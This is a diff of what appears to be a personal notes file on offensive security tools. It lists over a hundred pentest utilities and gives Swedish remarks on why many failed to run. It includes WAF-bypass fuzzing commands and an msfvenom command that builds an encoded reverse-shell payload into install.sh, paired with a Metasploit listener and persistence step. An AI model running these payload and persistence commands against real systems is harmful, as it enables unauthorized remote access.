@@ -16,29 +16,10 @@ FDA21CFRPart11, CISAWSFBv1.3, ACSCISM, ACSCEssential8, NCSCCloudSecPrinciples.
 76. WebSlayer 77. Websploit 78. WhatBreach 79. XssScan 80. Weeman 81. Spiderfoot 82. Dnmap 83. Automater 84. Arachni 85. Gobuster 
 86. ProxyStrike 87. Webshag 88. DotDotPwn 89. Skipfish 90. Cups 91. Spf 92. WhatWeb 93. Pwnat 94. ONSChef 95. Parsero  96. XssStrike  
 97. Xplice 98. OSIF 99. DNSRecon 100. Wafw00f 101. Masscan 102. Legion 103. Iodine 104. Cadaver 105. Laudanum 106. Hfind FLS 107. InSpy 
-108. OSINT-Spy 109. ReconCobra 110. Inquisitor 111. PhoneInfoga
+108. OSINT-Spy 109. ReconCobra 110. Inquisitor 111. PhoneInfoga 112.
 
-1. 746 issues, Gemfile.lock nokogiri. 2. API nycklar, funktion inte värt priset 3. Minimal funktion/begränsad 4. Java är problematiskt 
-5. Minimal funktion/begränsad 6. Java ar problematiskt 7-9. For många referenser till andra verktyg 10. Systemkollaps 11. Gemfile.lock
-12. Minimal funktion 13. Machinery modulen finns inte 14. Syntax error 15. For manga referenser till ... 16. /apt/sources.list
-17. Raderar mysql.socket av misstag 18. Syntax error 19. Baserad pá Metasploit 20. Browsern syns inte på panelen, packet storm
-21. Hostapd, no pem, certifikat problem 22. Mdk3, fake AP. packet storm 23. Config.json gulp. visas inte pá webben, docker build tag
-24. API nyckel, funktion inte värt priset 25. Syntax error 26. /apt/sources.list 27-32. Minimal funktion 30. For många referencer ...
-33-34. Syntax error 35. Systemkollaps 36-37. Pipe kollaps 38. Too big for virtualbox 39. For många referenser ... 40. Systemkollaps 
-41. Nokogiri, Trollo api for trollop 42. Syntax error 43. Bundle install, Gemtle lock 44. Systemkollaps 45. Minimal funktion 
-46. Bundle install, Gemfile.lock 47. Syntax error 48. Wordlists 49. x 50. Java ar problematiskt 51. Minimal funktion
-52. Baserad pá Metaspioit 53. Minimal funktion 54. unknown (x) 55. Baserad pâ Kismet, drivrutin error 56 För gammal  
-57. Certificat error, snarlik med BeEF och BurpSuite 58 API nycklar funktion into várt priset 59-60. For gammal 61. Error in GET 
-62. AttributeError 63 Virtualenv de into värt besváret 64. Six modulen finns into 65. No Sphinx modul 66. For gammal 
-67. Java ar problematiskt 68. unknown (x) 69. Virtualenv àr into värt besväret 70. 349 issues, Gemfile.lock 71. AttributeError 
-72. For gammal 73-80. Systemkollaps 81. For gammal 82. Minimal funktion 83. Baserad pá Metasploit 84. API nycklar, inte várt priset 
-85. SSL issues 86. Java ar problematiskt 87. Systemkollaps 88. Syntax error 31. Minimal funktion 89. For gammal, MIME db är död  
-90. Unknown (x) 91. For gammal 92. SSL issues  93. Stdlib.h (c++) finns inte 94 TypeError between 'str' och 'bool' 95 For gammal  
-96. TypeError objekt stöds into for signering 97. GeolPrangz finns into, HTTP 404 98. Minimal funktion 
-
-What worked for me with USB: 1. Remot3d, 2. IndoXploit, 3. XAttacker, 4. SQLMap, 5. Pappy, 6. Mitmproxy, 7. Arjun, 8. Commix, 
-9. Autosploit, 10. Witchxtool, 11. Mitmweb, 12. Poly, 13. Parameth, 14. Docem, 15. Chankro, 16. Wafninja, 17. Wafpass
-
+What worked for me with USB boot. 1. Remot3d, 2. IndoXploit, 3. XAttacker, 4. SQLMap, 5. Pappy, 6. Mitmproxy, 7. Arjun, 8. Commix, 9. Autosploit, 10. Witchxtool, 11. Mitmweb, 12. Poly, 13. Parameth, 14. Docem, 15. Chankro, 16. Wafninja, 17. Wafpass
+```
 apt-get clean && apt-get update && apt-get upgrade -y && apt-get dist-upgrade -y
 id && pwd && uname -a && ip -br a
 nano /esc/proxychains.com #dynamic_chain
@@ -130,8 +111,26 @@ python wafninja.py fuzz -u "http://localhost/action.php?id=FUZZ/" -c "phpsessid=
 python3 wafpass.py --url http://localhost/action.phpPname=discobisquits8oweigth=discobisquits
 
 scrapy genspider -t crawl exam coinbase.com && scrapy crawl quotes : -O q.json -a tag=humor scrapy shell 'url' : file.html && text response.css("span.text::text").getall() && quotesbot / scrapy toscrape-css -o q.json && scrapy fetch -nolog --headers url
-
-msfconsole is a toolkit for embedding payloads to induce reverse shell of binaries. See more in exploit-db.com, searchsploit, msfvenom, setoolkit and u3-pwn. Firewalls are his enemy. Payload: Binary connection in reverse. Exploit: Virus that bring shell if executed. Encoder: Padding zeros in binary tails. Fuzzer: Overflow apps to crash with ICMP packets. LPORT: netcat -l 80 or apache2 start. RPORT: 22 with SSH mitm attack. Commands: use - multi/handler is a listener, show, set, exploit. PostgreSQL inside RDS, msfdb init,, db_rebuild_cache. 
+```
+msfconsole is a toolkit for embedding payloads to induce reverse shell of binaries. See more in exploit-db.com, searchsploit, msfvenom, setoolkit and u3-pwn. Firewalls are his enemy. Payload: Binary connection in reverse. Exploit: Virus that bring shell if executed. Encoder: Padding zeros in binary tails. Fuzzer: Overflow apps to crash with ICMP packets. LPORT: netcat -l 80 or apache2 start. RPORT: 22 with SSH mitm attack. Commands: use - multi/handler is a listener, show, set, exploit. PostgreSQL inside RDS, msfdb init, db_rebuild_cache. 
 
 metasploitable 3 in virtualbox && msfvenom -p linux/x86/shell/reverse_tcp LHOST=ip LPORT=80 -e ruby/base64 -f bash -n 26 > install.sh
 msfconsole, use exploit/multi/handler, set payload linux/x86/shell/reverse_tcp, show options, set LHOST=ip, exploit,, run persistence -h   
+
+1. 746 issues, Gemfile.lock nokogiri. 2. API nycklar, funktion inte värt priset 3. Minimal funktion/begränsad 4. Java är problematiskt 
+5. Minimal funktion/begränsad 6. Java ar problematiskt 7-9. For många referenser till andra verktyg 10. Systemkollaps 11. Gemfile.lock
+12. Minimal funktion 13. Machinery modulen finns inte 14. Syntax error 15. For manga referenser till ... 16. /apt/sources.list
+17. Raderar mysql.socket av misstag 18. Syntax error 19. Baserad pá Metasploit 20. Browsern syns inte på panelen, packet storm
+21. Hostapd, no pem, certifikat problem 22. Mdk3, fake AP. packet storm 23. Config.json gulp. visas inte pá webben, docker build tag
+24. API nyckel, funktion inte värt priset 25. Syntax error 26. /apt/sources.list 27-32. Minimal funktion 30. For många referencer ...
+33-34. Syntax error 35. Systemkollaps 36-37. Pipe kollaps 38. Too big for virtualbox 39. For många referenser ... 40. Systemkollaps 
+41. Nokogiri, Trollo api for trollop 42. Syntax error 43. Bundle install, Gemtle lock 44. Systemkollaps 45. Minimal funktion 
+46. Bundle install, Gemfile.lock 47. Syntax error 48. Wordlists 49. x 50. Java ar problematiskt 51. Minimal funktion
+52. Baserad pá Metaspioit 53. Minimal funktion 54. unknown (x) 55. Baserad pâ Kismet, drivrutin error 56 För gammal  
+57. Certificat error, snarlik med BeEF och BurpSuite 58 API nycklar funktion into várt priset 59-60. For gammal 61. Error in GET 
+62. AttributeError 63 Virtualenv de into värt besváret 64. Six modulen finns into 65. No Sphinx modul 66. For gammal 
+67. Java ar problematiskt 68. unknown (x) 69. Virtualenv àr into värt besväret 70. 349 issues, Gemfile.lock 71. AttributeError 
+72. For gammal 73-80. Systemkollaps 81. For gammal 82. Minimal funktion 83. Baserad pá Metasploit 84. API nycklar, inte várt priset 
+85. SSL issues 86. Java ar problematiskt 87. Systemkollaps 88. Syntax error 31. Minimal funktion 89. For gammal, MIME db är död  
+90. Unknown (x) 91. For gammal 92. SSL issues  93. Stdlib.h (c++) finns inte 94 TypeError between 'str' och 'bool' 95 For gammal  
+96. TypeError objekt stöds into for signering 97. GeolPrangz finns into, HTTP 404 98. Minimal funktion 
